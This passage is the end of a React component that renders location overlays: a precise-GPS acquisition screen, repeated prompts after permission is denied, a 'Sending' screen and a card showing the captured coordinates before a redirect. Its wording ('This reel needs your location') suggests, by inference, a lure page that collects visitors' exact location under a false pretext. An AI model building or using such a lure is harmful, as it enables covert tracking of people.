            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-blue-500/20 flex items-center justify-center mb-4 relative">
                  <Crosshair className="w-8 h-8 text-blue-400" />
                  <motion.div className="absolute inset-0 rounded-full border-2 border-blue-400/50" animate={{ scale: [1, 1.3, 1], opacity: [0.5, 0, 0.5] }} transition={{ duration: 1.5, repeat: Infinity }} />
                </div>
                <h3 className="text-white text-lg font-semibold mb-2">Getting Precise Location</h3>
                <p className="text-gray-400 text-sm mb-3 leading-5">Improving accuracy. Hold still for a moment...</p>
                {currentAccuracy !== null && (
                  <div className="w-full space-y-2">
                    <div className="flex justify-between text-xs">
                      <span className="text-gray-400">Current Accuracy</span>
                      <span className={`font-mono ${currentAccuracy <= ACCURACY_THRESHOLD ? 'text-green-400' : 'text-yellow-400'}`}>{currentAccuracy.toFixed(1)}m</span>
                    </div>
                    <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
                      <div className={`h-full rounded-full transition-all duration-500 ${currentAccuracy <= 10 ? 'bg-green-500' : currentAccuracy <= 20 ? 'bg-green-400' : currentAccuracy <= 30 ? 'bg-yellow-400' : currentAccuracy <= 50 ? 'bg-orange-400' : 'bg-red-400'}`} style={{ width: `${Math.max(5, Math.min(100, (1 - currentAccuracy / 100) * 100))}%` }} />
                    </div>
                    <div className="flex justify-between text-xs">
                      <span className="text-gray-500">Target: &lt;{ACCURACY_THRESHOLD}m</span>
                      <span className="text-gray-500">Attempt #{attemptNumber}</span>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== PERMISSION DENIED OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'permission_denied' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0, y: 20 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.8, opacity: 0, y: 20 }} transition={{ type: 'spring', damping: 20, stiffness: 300 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-red-400" /></div>
                <h3 className="text-white text-lg font-semibold mb-2">Location Access Required</h3>
                <p className="text-gray-400 text-sm mb-4 leading-5">
                  {deniedCount >= 2
                    ? 'You have denied location permission. Please allow it from your browser settings to continue:'
                    : 'This reel needs your location. Please allow the permission when prompted.'}
                </p>
                {deniedCount >= 2 && (
                  <div className="w-full bg-gray-800/80 rounded-xl p-3 mb-4 text-left space-y-2">
                    <p className="text-gray-300 text-xs font-semibold mb-1">How to enable location:</p>
                    <div className="text-gray-400 text-[11px] space-y-1">
                      <p>1. Tap the <span className="text-blue-400">lock/info icon</span> in the address bar</p>
                      <p>2. Find <span className="text-white">Location</span> permission</p>
                      <p>3. Change it to <span className="text-green-400">Allow</span></p>
                      <p>4. Tap the button below to reload</p>
                    </div>
                  </div>
                )}
                <button onClick={handleDenyOk} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-xl transition-colors active:scale-95">
                  {deniedCount >= 2 ? (
                    <span className="flex items-center justify-center gap-2"><RefreshCw className="w-4 h-4" />Reload & Request Permission</span>
                  ) : (
                    <span className="flex items-center justify-center gap-2"><MapPin className="w-4 h-4" />Allow Location Access</span>
                  )}
                </button>
                {deniedCount >= 1 && deniedCount < 2 && <p className="text-gray-500 text-xs mt-3">Tapping the button will show the permission prompt again</p>}
                {deniedCount >= 2 && <p className="text-gray-500 text-xs mt-3">The page will refresh to request permission again</p>}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== SENDING OVERLAY ===== */}
      <AnimatePresence>
        {showRedirectOverlay && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center mb-4">
                  <div className="w-8 h-8 rounded-full border-3 border-green-400 border-t-transparent animate-spin" />
                </div>
                <h3 className="text-white text-lg font-semibold mb-2">Processing...</h3>
                <p className="text-gray-400 text-sm leading-5">Verifying your location, please wait...</p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== LOCATION CAPTURED OVERLAY (Before Redirect) - ENHANCED ===== */}
      <AnimatePresence>
        {appState === 'location_captured' && locationData && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center">
            <motion.div
              initial={{ scale: 0.8, opacity: 0, y: 30 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.8, opacity: 0, y: 30 }}
              transition={{ type: 'spring', damping: 20, stiffness: 300 }}
              className="bg-gray-900/95 rounded-2xl p-6 mx-6 max-w-sm w-full border border-white/10"
            >
              <div className="flex flex-col items-center text-center">
                {/* Success Icon with animation */}
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ type: 'spring', damping: 12, stiffness: 200, delay: 0.1 }}
                  className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center mb-3"
                >
                  <CheckCircle2 className="w-9 h-9 text-green-400" />
                </motion.div>

                <h3 className="text-white text-lg font-semibold mb-1">Location Captured!</h3>
                <p className="text-gray-400 text-sm mb-3">We have successfully captured your precise location</p>

                {/* Accuracy Badge */}
                <div className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full mb-3 ${
                  locationData.accuracy <= 10 ? 'bg-emerald-500/20' : locationData.accuracy <= 20 ? 'bg-green-500/20' : 'bg-yellow-500/20'
                }`}>
                  <Shield className={`w-3.5 h-3.5 ${getAccuracyRating(locationData.accuracy).color}`} />
                  <span className={`text-xs font-semibold ${getAccuracyRating(locationData.accuracy).color}`}>
                    {getAccuracyRating(locationData.accuracy).label} ACCURACY
                  </span>
                </div>

                {/* User-friendly accuracy message */}
                <p className={`text-sm mb-4 ${getAccuracyRating(locationData.accuracy).color}`}>
                  {getAccuracyRating(locationData.accuracy).description}
                </p>

                {/* Location Details Card */}
                <div className="w-full bg-gray-800/70 rounded-xl p-4 mb-4 text-left space-y-3">
                  {/* Accuracy */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Crosshair className="w-4 h-4 text-gray-400" />
                      <span className="text-gray-400 text-sm">Accuracy</span>
                    </div>
                    <span className={`text-sm font-mono font-semibold ${getAccuracyRating(locationData.accuracy).color}`}>
                      {locationData.accuracy.toFixed(1)}m
                    </span>
                  </div>

                  {/* Coordinates */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Navigation className="w-4 h-4 text-gray-400" />
                      <span className="text-gray-400 text-sm">Coordinates</span>
                    </div>
                    <span className="text-white text-xs font-mono">
                      {locationData.latitude.toFixed(6)}, {locationData.longitude.toFixed(6)}
                    </span>
                  </div>

                  {/* Captured At */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Clock className="w-4 h-4 text-gray-400" />
                      <span className="text-gray-400 text-sm">Captured</span>
                    </div>
                    <span className="text-white text-xs">
                      {new Date(locationData.timestamp).toLocaleTimeString()}
                    </span>
                  </div>

                  {/* Accuracy Bar */}
                  <div className="pt-1">
                    <div className="w-full h-2 bg-gray-700 rounded-full overflow-hidden">
                      <div
                        className={`h-full rounded-full transition-all duration-700 ${
                          locationData.accuracy <= 10 ? 'bg-emerald-500' : locationData.accuracy <= 20 ? 'bg-green-400' : 'bg-yellow-400'
                        }`}
                        style={{ width: `${Math.max(10, Math.min(100, (1 - locationData.accuracy / 100) * 100))}%` }}
                      />
                    </div>
                    <div className="flex justify-between mt-1">
                      <span className="text-gray-500 text-[10px]">0m</span>
                      <span className="text-gray-500 text-[10px]">100m+</span>
                    </div>
                  </div>
                </div>

                {/* Google Maps Link */}
                <a
                  href={`https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full flex items-center justify-center gap-2 bg-gray-800/60 hover:bg-gray-700/60 text-blue-400 text-sm py-2.5 rounded-xl transition-colors mb-4"
                >
                  <MapPin className="w-4 h-4" />
                  <span>View on Google Maps</span>
                  <ExternalLink className="w-3 h-3" />
                </a>

                {/* Continue Button */}
                <button
                  onClick={handleContinueRedirect}
                  className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold py-3 rounded-xl transition-all active:scale-[0.98] shadow-lg shadow-blue-500/20"
                >
                  Continue
                </button>

                <p className="text-gray-500 text-[11px] mt-3">Your location has been verified. You will be redirected shortly.</p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
